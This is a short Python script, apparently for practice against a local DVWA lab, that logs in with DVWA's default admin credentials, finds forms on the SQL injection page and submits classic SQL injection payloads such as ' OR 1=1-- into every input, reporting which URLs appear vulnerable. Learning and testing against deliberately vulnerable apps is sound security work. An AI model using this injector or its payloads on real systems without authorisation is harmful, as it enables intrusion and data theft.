import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

class SQLiTester:

    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerable_urls = []
        self.tested_urls = []

        self.payloads = [
            "' OR 1=1--",
            "' OR '1'='1",
            "admin' --"
        ]

    # ---------------- LOGIN ----------------
    def login_dvwa(self):
        login_url = "http://localhost:8080/login.php"

        data = {
            "username": "admin",
            "password": "password",
            "Login": "Login"
        }

        r = self.session.post(login_url, data=data)

        if "Login failed" not in r.text:
            print("[✅] DVWA Login Successful")
            return True
        return False

    # ---------------- FIND FORMS ----------------
    def discover_inputs(self):
        r = self.session.get(self.base_url)
        soup = BeautifulSoup(r.text, "html.parser")

        forms = soup.find_all("form")

        print(f"[+] {len(forms)} form found ✅")
        return forms

    # ---------------- TEST SQLI ----------------
    def test_sql_injection(self, forms):
        print("\n[*] Starting SQL Injection tests...\n")

        for form in forms:
            action = form.get("action")
            target = urljoin(self.base_url, action)

            print(f"[*] Testing → {target}")

            inputs = form.find_all("input")

            for payload in self.payloads:
                data = {}

                for i in inputs:
                    name = i.get("name")
                    if name:
                        data[name] = payload

                r = self.session.post(target, data=data)

                self.tested_urls.append(target)

                if "Welcome" in r.text or "exists in the database" in r.text:
                    print(f"\n🔥 SQL INJECTION SUCCESS!")
                    print(f"Payload: {payload}")
                    print(f"URL: {target}\n")

                    self.vulnerable_urls.append(target)
                    return

        print("✅ No SQL Injection patterns detected.")

    # ---------------- REPORT ----------------
    def report(self):
        print("\n━━━━━━━━━━━━━━━━━━ FINAL REPORT ━━━━━━━━━━━━━━━━━━\n")
        print(f"✅ Tested URLs : {len(self.tested_urls)}")

        if self.vulnerable_urls:
            print(f"🔥 Vulnerabilities Found : {len(self.vulnerable_urls)}")
            for url in self.vulnerable_urls:
                print(f"⚠ {url}")
        else:
            print("🛡 No vulnerabilities detected")


# ---------------- MAIN ----------------
if __name__ == "__main__":

    print("[*] Starting SQL Injection tests...\n")

    target = "http://localhost:8080/vulnerabilities/sqli/"

    tester = SQLiTester(target)

    if tester.login_dvwa():
        forms = tester.discover_inputs()
        tester.test_sql_injection(forms)
        tester.report()
